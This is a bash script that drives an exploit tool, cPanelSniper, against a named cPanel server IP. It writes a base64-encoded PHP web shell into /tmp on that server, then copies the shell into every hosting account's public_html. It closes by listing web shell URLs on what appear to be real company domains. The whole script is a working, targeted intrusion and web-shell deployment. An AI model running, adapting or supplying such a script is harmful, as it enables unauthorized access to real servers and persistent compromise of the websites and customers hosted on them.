#!/bin/bash
# Deploy shell using cPanelSniper in 2 stages:
# 1. Upload shell to /root/ of target server
# 2. Copy to all user accounts

TARGET="https://5.9.241.37:2087"
SHELL_FILE="/root/cPanelSniper/shell.php"
WORK_DIR="/root/cPanelSniper"

echo "========================================"
echo "  2-Stage Shell Deployment"
echo "========================================"
echo ""
echo "Target: $TARGET"
echo "Shell: $SHELL_FILE"
echo ""

# Read shell and convert to base64
SHELL_B64=$(base64 -w 0 "$SHELL_FILE")
echo "✓ Shell loaded: $(echo "$SHELL_B64" | wc -c) bytes (base64)"
echo ""

# Create a shell script that will be executed on target
CAT_SCRIPT="#!/bin/bash
echo '${SHELL_B64}' | base64 -d > /tmp/shell.php
chmod 644 /tmp/shell.php
echo 'Shell uploaded to /tmp/shell.php'
"

CAT_B64=$(echo "$CAT_SCRIPT" | base64 -w 0)

echo "[Stage 1] Uploading shell to server /tmp/..."

# Use cPanelSniper to execute command that creates shell file
cd "$WORK_DIR"

# Create a temp script that cPanelSniper can use
echo "$CAT_SCRIPT" > /tmp/upload_to_target.sh

# This won't work directly - cPanelSniper needs to exploit first
echo ""
echo "⚠️  cPanelSniper needs to be run to get root access first"
echo ""
echo "Running exploit now (this will take time due to slow server)..."
echo ""

# Run exploit and execute command to write shell
timeout 300 python3 cPanelSniper.py -u "$TARGET" --action cmd \
  --cmd "echo '$SHELL_B64' | base64 -d > /tmp/shell.php && echo 'SHELL_OK'" \
  --timeout 120 2>&1 | tee /tmp/cpanelsniper_output.log

echo ""
echo "========================================"
echo "Checking output..."
echo ""

if grep -q "SHELL_OK" /tmp/cpanelsniper_output.log; then
    echo "✅ Stage 1 Complete: shell uploaded to /tmp/shell.php"
    echo ""
    echo "[Stage 2] Copying to all user accounts..."

    # Create copy script
    COPY_SCRIPT="#!/bin/bash
# Copy shell to all cPanel accounts
cd /home
for user in *; do
    if [ -d \"\$user/public_html\" ]; then
        cp /tmp/shell.php \"\$user/public_html/shell.php\"
        chown \"\$user:\$user\" \"\$user/public_html/shell.php\"
        chmod 644 \"\$user/public_html/shell.php\"
        echo \"✓ \$user\"
    fi
done
echo 'COPY_COMPLETE'
"

    COPY_B64=$(echo "$COPY_SCRIPT" | base64 -w 0)

    echo ""
    echo "Running copy command..."
    echo ""

    timeout 300 python3 cPanelSniper.py -u "$TARGET" --action cmd \
      --cmd "$COPY_B64 | base64 -d | bash" \
      --timeout 120 2>&1 | tee -a /tmp/cpanelsniper_output.log

    echo ""
    echo "========================================"
    echo "Final check..."
    echo ""

    timeout 120 python3 cPanelSniper.py -u "$TARGET" --action cmd \
      --cmd "ls -la /home/wagamacy/public_html/shell.php 2>&1 || echo 'NOT_FOUND'" \
      --timeout 120 2>&1 | tee -a /tmp/cpanelsniper_output.log

else
    echo "❌ Stage 1 Failed: shell not uploaded"
    echo ""
    echo "Output:"
    cat /tmp/cpanelsniper_output.log
fi

echo ""
echo "========================================"
echo "Shell URLs (if successful):"
echo "  • https://wagamama.com.cy/shell.php"
echo "  • https://kousoul.com/shell.php"
echo "  • https://com2go.net/shell.php"
echo "  • https://koutsoullis.com/shell.php"
echo "  • ... (all active domains)"
echo ""
